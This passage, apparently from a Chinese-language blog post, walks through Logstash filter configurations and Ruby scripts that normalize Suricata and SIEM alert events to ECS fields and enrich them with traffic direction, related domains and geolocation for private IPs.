<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;request_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Connection&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;Keep-Alive&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;response_headers&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Server&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;value&quot;</span>: <span class="string">&quot;NWS_TCloud_S11&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>标准化之后的数据：</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;http&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;request&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;host&quot;</span>: <span class="string">&quot;192.168.199.1:25782&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;Close&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;user-agent&quot;</span>: <span class="string">&quot;Microsoft-Windows/10.0 UPnP/1.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;accept&quot;</span>: <span class="string">&quot;text/xml, application/xml&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;response&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;ext&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-length&quot;</span>: <span class="string">&quot;2645&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;server&quot;</span>: <span class="string">&quot;RT-N56U/3.4.3.9 UPnP/1.1 MiniUPnPd/2.0&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;content-type&quot;</span>: <span class="string">&quot;text/xml; charset=\&quot;utf-8\&quot;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;connection&quot;</span>: <span class="string">&quot;close&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="1-1-7-normalized-tls-for-suricata"><a href="#1-1-7-normalized-tls-for-suricata" class="headerlink" title="1.1.7 normalized-tls_for_suricata"></a>1.1.7 normalized-tls_for_suricata</h5><h6 id="Logstash-Config-6"><a href="#Logstash-Config-6" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/60_normalized-tls.conf">normalized-tls_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][tls] &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            uppercase =&gt; [</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span></span><br><span class="line">            ]</span><br><span class="line">            split =&gt; &#123; </span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;:&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            join =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            copy =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;[tls][server][hash][sha1]&quot;</span> =&gt; <span class="string">&quot;[related][hash]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="1-2-normalized-alarm-from-siem"><a href="#1-2-normalized-alarm-from-siem" class="headerlink" title="1.2 normalized-alarm_from_siem"></a>1.2 normalized-alarm_from_siem</h4><p>​        针对alarm事件进行标准化，也就是SIEM发出的数据。参考上图中红色线所示部分</p>
<h5 id="1-2-1-normalized-alarm"><a href="#1-2-1-normalized-alarm" class="headerlink" title="1.2.1 normalized-alarm"></a>1.2.1 normalized-alarm</h5><p>​        通用alarm事件标准化配置。</p>
<h6 id="Logstash-Config-7"><a href="#Logstash-Config-7" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/70_normalized-siem.conf">normalized-alarm.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    date &#123;</span><br><span class="line">        match =&gt; [<span class="string">&quot;timestamp&quot;</span>, <span class="string">&quot;ISO8601&quot;</span>]</span><br><span class="line">        target =&gt; <span class="string">&quot;timestamp&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        rename =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[data][source]&quot;</span> =&gt; <span class="string">&quot;source&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][destination]&quot;</span> =&gt; <span class="string">&quot;destination&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][network]&quot;</span> =&gt; <span class="string">&quot;network&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][event]&quot;</span> =&gt; <span class="string">&quot;event&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][fileset]&quot;</span> =&gt; <span class="string">&quot;fileset&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="string">&quot;[data][http]&quot;</span> =&gt; <span class="string">&quot;http&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][url]&quot;</span> =&gt; <span class="string">&quot;url&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][user_agent]&quot;</span> =&gt; <span class="string">&quot;user_agent&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[data][related]&quot;</span> =&gt; <span class="string">&quot;related&quot;</span></span><br><span class="line">            <span class="string">&quot;[data][threat]&quot;</span> =&gt; <span class="string">&quot;threat&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][groups]&quot;</span> =&gt; <span class="string">&quot;[rule][ruleset]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        convert =&gt; &#123;</span><br><span class="line">            <span class="comment">#&quot;[agent][id]&quot; =&gt; &quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[event][severity]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[related][rule][id]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[network][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[network][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[source][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[source][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[destination][port]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[destination][packets]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="string">&quot;[http][response][status_code]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">            <span class="string">&quot;[http][response][body][bytes]&quot;</span> =&gt; <span class="string">&quot;integer&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        remove_field =&gt; [</span><br><span class="line">            <span class="string">&quot;beat&quot;</span>, <span class="string">&quot;input_type&quot;</span>, <span class="string">&quot;tags&quot;</span>, <span class="string">&quot;count&quot;</span>, <span class="string">&quot;@version&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ecs&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;offset&quot;</span>, <span class="string">&quot;type&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;predecoder&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decoder&quot;</span>, <span class="string">&quot;[data][rule]&quot;</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        copy =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[rule][description]&quot;</span> =&gt; <span class="string">&quot;[rule][name]&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        mutate &#123;</span><br><span class="line">            rename =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;previous_output&quot;</span> =&gt; <span class="string">&quot;[related][event][log]&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                src_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                dst_ip = event.get(&#x27;[destination][ip]&#x27;)</span></span><br><span class="line"><span class="string">                src_port = event.get(&#x27;[source][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                dst_port = event.get(&#x27;[destination][port]&#x27;).to_s</span></span><br><span class="line"><span class="string">                rule_name = event.get(&#x27;[related][rule][name]&#x27;)[0].to_s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                rule_description = src_ip + &#x27;:&#x27; + src_port + &#x27; -&gt; &#x27; + dst_ip + &#x27;:&#x27; + dst_port + &#x27; -&gt; &#x27; + rule_name</span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][description]&#x27;, rule_description)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                if event.get(&#x27;[related][rule][id]&#x27;) then</span></span><br><span class="line"><span class="string">                    sid = event.get(&#x27;[related][rule][id]&#x27;)[0]</span></span><br><span class="line"><span class="string">                    event.set(&#x27;[rule][uuid]&#x27;, sid)</span></span><br><span class="line"><span class="string">                end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                event.set(&#x27;[rule][category]&#x27;, &#x27;Frequency&#x27;)</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Enrichment"><a href="#2-Enrichment" class="headerlink" title="2. Enrichment"></a>2. Enrichment</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/enrichment-0.1.png" alt="image-20201208110506481"></p>
<hr>
<h4 id="2-1-enrichment-alert-to-siem"><a href="#2-1-enrichment-alert-to-siem" class="headerlink" title="2.1 enrichment_alert_to_siem"></a>2.1 enrichment_alert_to_siem</h4><p>​        针对alert事件进行丰富化，也就是安全设备发出的原始安全事件。参考上图中蓝色线所示部分</p>
<h5 id="2-1-1-enrichment-alert-direction-for-suricata"><a href="#2-1-1-enrichment-alert-direction-for-suricata" class="headerlink" title="2.1.1 enrichment-alert_direction_for_suricata"></a>2.1.1 enrichment-alert_direction_for_suricata</h5><p>​        由于一些特殊原因，我不得不将<strong>suricata.yaml</strong>配置文件中的<code>EXTERNAL_NET = any</code>。这也导致了部分Suricata告警的误报，毕竟放开了规则的方向这个收敛条件。所以，我利用了Logstash 在数据入库到SIEM之前做了一层过滤。</p>
<h6 id="Logstash-Config-8"><a href="#Logstash-Config-8" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-alert_direction.conf">enrichment-alert_direction_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [rule][description] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/add_direction.rb&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-1"><a href="#Ruby-Code-1" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/add_direction.rb">enrichment-alert_direction_for_suricata.rb</a></strong><ul>
<li><em>过滤触发规则的IP与规则方向不匹配的安全事件</em></li>
<li><em>增加方向与区域的字段，便于分析人员第一时间识别<strong>内对内</strong>以及<strong>内对外</strong>的告警。</em></li>
</ul>
</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;ipaddr&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> src_ip <span class="keyword">or</span> <span class="keyword">not</span> dst_ip <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    ipaddr_src = IPAddr.new src_ip</span><br><span class="line">    ipaddr_dst = IPAddr.new dst_ip</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Sample: alert http $EXTERNAL_NET any -&gt; $HOME_NET any</span></span><br><span class="line">    rule = event.get(<span class="string">&quot;[rule][description]&quot;</span>)</span><br><span class="line">    src_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    dst_direction = rule.split(<span class="string">&quot; &quot;</span>)[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    src_private = ipaddr_src.private?()</span><br><span class="line">    dst_private = ipaddr_dst.private?()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> event.get(<span class="string">&quot;provider&quot;</span>) == <span class="string">&quot;Suricata&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> ( src_private ) <span class="keyword">and</span> ( src_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( dst_private ) <span class="keyword">and</span> ( dst_direction == <span class="string">&quot;$EXTERNAL_NET&quot;</span> ) <span class="keyword">then</span></span><br><span class="line">            event.cancel</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> src_private <span class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> src_private <span class="keyword">and</span> <span class="keyword">not</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;outbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;internal&quot;</span></span><br><span class="line">    <span class="keyword">elsif</span> <span class="keyword">not</span> src_private <span class="keyword">and</span> dst_private <span class="keyword">then</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        direction = <span class="string">&quot;inbound&quot;</span></span><br><span class="line">        zone = <span class="string">&quot;external&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&quot;[network][direction]&quot;</span>, direction)</span><br><span class="line">    event.set(<span class="string">&quot;[network][zone]&quot;</span>, zone)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-2-enrichment-related-domain-for-suricata"><a href="#2-1-2-enrichment-related-domain-for-suricata" class="headerlink" title="2.1.2 enrichment_related_domain_for_suricata"></a>2.1.2 enrichment_related_domain_for_suricata</h5><p>​        为了便于后期做关联分析，增加了攻击者与域名的关联字段。</p>
<h6 id="Logstash-Config-9"><a href="#Logstash-Config-9" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/72_enrichment-related_domain.conf">enrichment_related_domain_for_suricata.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [url][domain] &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            code =&gt; <span class="string">&quot;</span></span><br><span class="line"><span class="string">                source_ip = event.get(&#x27;[source][ip]&#x27;)</span></span><br><span class="line"><span class="string">                url_domain = event.get(&#x27;[url][domain]&#x27;)</span></span><br><span class="line"><span class="string">                event.set(&#x27;[related][domain]&#x27;, [source_ip, url_domain])</span></span><br><span class="line"><span class="string">            &quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="2-1-3-add-geo-private-ip"><a href="#2-1-3-add-geo-private-ip" class="headerlink" title="2.1.3 add_geo-private_ip"></a>2.1.3 add_geo-private_ip</h5><p>​        为内网IP增加地理位置标示，主要是为了<strong>Dashboard</strong>展示的时候可以看到资产在地图上的坐标。<strong>地图炮？BIUBIUBIU？</strong>😂。由于不是外网IP没办法加载GeoIP进行匹配，这里使用了<strong>Translate</strong>这个插件来进行配置。</p>
<h6 id="Logstash-Conifg"><a href="#Logstash-Conifg" class="headerlink" title="Logstash Conifg"></a><strong>Logstash Conifg</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/70_enrichment-geo_private_ip.conf">add-geo_private_ip.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[source][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[source][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span class="string">&quot;translation_as&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_geo.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_geo&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][geo]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    translate &#123;</span><br><span class="line">        regex =&gt; <span class="literal">true</span></span><br><span class="line">        exact =&gt; <span class="literal">true</span></span><br><span class="line">        dictionary_path =&gt; <span class="string">&quot;/etc/logstash/scripts/private_ip_asn.yml&quot;</span></span><br><span class="line">        field =&gt; <span class="string">&quot;[destination][ip]&quot;</span></span><br><span class="line">        destination =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json &#123;</span><br><span class="line">        <span class="built_in">source</span> =&gt; <span class="string">&quot;translation_as&quot;</span></span><br><span class="line">        target =&gt; <span class="string">&quot;[destination][as]&quot;</span></span><br><span class="line">        skip_on_invalid_json =&gt; <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mutate &#123;</span><br><span class="line">        remove_field =&gt; [ <span class="string">&quot;translation_geo&quot;</span>, <span 